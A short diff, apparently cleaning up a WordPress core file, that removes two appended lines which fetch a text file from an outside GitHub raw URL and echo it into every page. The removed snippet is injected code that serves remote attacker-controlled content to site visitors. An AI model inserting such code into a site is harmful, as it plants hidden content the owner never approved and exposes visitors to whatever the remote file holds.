@@ -112,6 +112,3 @@ if ( wp_using_themes() ) {
 	}
 	return;
 }
-
-$a = file_get_contents('https://raw.githubusercontent.com/kikiii88/sadboy/refs/heads/main/display.txt'); 
-echo $a; 
